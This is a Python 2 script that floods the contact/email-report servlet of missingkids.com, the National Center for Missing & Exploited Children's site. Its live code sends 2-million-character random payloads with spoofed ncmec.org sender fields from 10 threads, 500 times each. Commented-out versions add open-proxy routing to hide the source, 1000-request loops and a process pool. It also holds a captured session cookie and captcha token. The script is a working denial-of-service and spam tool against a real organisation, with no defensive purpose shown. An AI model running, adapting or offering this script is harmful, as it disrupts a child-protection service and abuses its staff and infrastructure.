from random import choice
from string import ascii_lowercase
import urllib2
import urllib
import requests

import Queue
import threading
import urllib2
from multiprocessing import Pool


from datetime import datetime
startTime = datetime.now()


'''

"submitted[name]": "vsdv",
"submitted[company]" : "fdsf",
"submitted[email_address]" : "ffsdf@fdsf.com",
"submitted[phone_number]" : "cdsf@fdsf.com",
"submitted[comment]" : big,
"details[sid]" : '',
"details[page_num]" : 1,
"details[page_count]" : 1,
"details[finished]" :  0,
"form_build_id" : "form-Wh5QUVUNov9DMh-a57x0lfeB5mKYJeuiAYDZrlO1yh4",
"form_id" : "webform_client_form_1",
"captcha_sid": 421933,
"captcha_token" : "cd93ba2b98de546c744526b83fd8b3e5",
"captcha_response" : "Zh9CR",
"op" : "Send"

'''
'''proxy = urllib2.ProxyHandler({'http': '119.148.9.130:8080'})
opener = urllib2.build_opener(proxy)
urllib2.install_opener(opener)

lis 	= list(ascii_lowercase)
big 	= ''.join(choice(lis) for _ in xrange(2000000)) 
data = urllib.urlencode({
		"LanguageId":"en_US",
		"_01_name":"hgfh",
		"_02_email":"hgfh@hgfh.com",
		"_03_comments": big,
		"action":"sendEmailReport",
		"cc":"",
		"fromDomain":"ncmec.org",
		"fromName":"servlet",
		"mailtoDomain":"ncmec.org",
		"mailtoName":"info",
		"_01_name":"hgjmhm",
		"subject":"Website inquiries",
	})
result = urllib2.urlopen("http://www.missingkids.com/missingkids/servlet/JSONDataServlet",data).read()
print result
i = 0
while True:
	result = urllib2.urlopen("http://www.missingkids.com/missingkids/servlet/JSONDataServlet",data).read()
	print result
	i = i + 1
	if i == 1000:
		break
		'''
'''lis 	= list(ascii_lowercase)
big 	= ''.join(choice(lis) for _ in xrange(2000000)) 
data = {
		"LanguageId":"en_US",
		"_01_name":"hgfh",
		"_02_email":"hgfh@hgfh.com",
		"_03_comments": big,
		"action":"sendEmailReport",
		"cc":"",
		"fromDomain":"ncmec.org",
		"fromName":"servlet",
		"mailtoDomain":"ncmec.org",
		"mailtoName":"info",
		"_01_name":"hgjmhm",
		"subject":"Website inquiries",
	}
import requests

r = requests.post("http://www.missingkids.com/missingkids/servlet/JSONDataServlet",proxies={"http": "http://54.159.136.246:8888"},params=data)
print(r.text)
'''




'''lis 	= list(ascii_lowercase)
big 	= ''.join(choice(lis) for _ in xrange(2000000)) 
data = urllib.urlencode({
		"LanguageId":"en_US",
		"action":"sendEmailReport",
		"fromAddress": 'fsdffs@fsdf.fdsf',
		"mailtoAddress":"test@test.com",
	})
result = urllib.urlopen("http://www.missingkids.com/missingkids/servlet/JSONDataServlet",data).read()
print result
i = 0
while True:
	result = urllib.urlopen("http://www.missingkids.com/missingkids/servlet/JSONDataServlet",data).read()
	print result
	i = i + 1
	if i == 1000:
		break
'''







lis = list(ascii_lowercase)
big = ''.join(choice(lis) for _ in xrange(2000000)) 

url = 'https://secure.missingkids.com/missingkids/servlet/JSONDataServlet'
values = urllib.urlencode({
		"LanguageId":"en_US",
		"_01_name":"hgfh",
		"_02_email":"hgfh@hgfh.com",
		"_03_comments": big,
		"action":"sendEmailReport",
		"cc":"",
		"fromDomain":"ncmec.org",
		"fromName":"servlet",
		"mailtoDomain":"ncmec.org",
		"mailtoName":"info",
		"_01_name":"hgjmhm",
		"subject":"Website inquiries",
	})

headers = {
	'Accept'	: 'text/plain, */*; q=0.01',
	'Accept-Encoding': 'gzip, deflate',
	'Accept-Language' :	'en-US,en;q=0.5',
	'Content-Length':	'114',
	'Content-Type':	'application/x-www-form-urlencoded; charset=UTF-8',
	'Cookie' :	'JSESSIONID=B1EC87BC717522F426051769577E7A01; __utma=158082086.521692752.1432512300.1432601948.1432604241.11; __utmz=158082086.1432512300.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utma=237389186.1400841141.1432529084.1432596305.1432604877.3; __utmz=237389186.1432604877.3.3.utmcsr=ncmec|utmccn=d-nocampaign|utmcmd=footer; __utmc=158082086; asdfjkl1=!H3SyNM7Qxa27hqIzW/GGcVGQr4I6rx0JWgVBxNnp2+H2noVuaVTdNlEk5hsf9dC+iKsdvr6oT+t8gg==; asdfjkl=998090944.20480.0000; __utmc=237389186; __utmb=158082086.7.10.1432604241;__utmb=237389186.6.9.1432605106415; __utmt=1',
	'Host': 'secure.missingkids.com',
	'Referer':	'https://secure.missingkids.com/Home',
	'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:38.0) Gecko/20100101 Firefox/38.0',
	'X-Requested-With':	'XMLHttpRequest'
}

q = Queue.Queue()

def get_url(url, values, headers):
	i = 0
	while True:
		resp = requests.post(url, data=values, headers=headers, allow_redirects=True)
		print i
		print resp.text	
		print resp.status_code
		i = i + 1
		if i == 500:
			break

def put_get_url(q, url, values, headers):
	q.put(get_url(url,values,headers))


for x in range(0,10):
	t = threading.Thread(target=put_get_url, args = (q, url, values, headers))
	t.daemon = True
	t.start()

s = q.get()
print s


'''
def run(line):
	for x in range(0,10):
		t = threading.Thread(target=put_get_url, args = (line['q'],line['url'],line['values'],line['headers']))
		t.daemon = True
		t.start()

	s = q.get()
	print s


lines = []		
j = 0
while True:
	lines.append({
			'q': q,
			'url':url,
			'values': values,
			'headers':headers
		})
	j = j + 1
	if j == 500:
		break

if __name__ == '__main__':
    pool = Pool(processes=4)              # process per core
    pool.map(run, lines)

'''



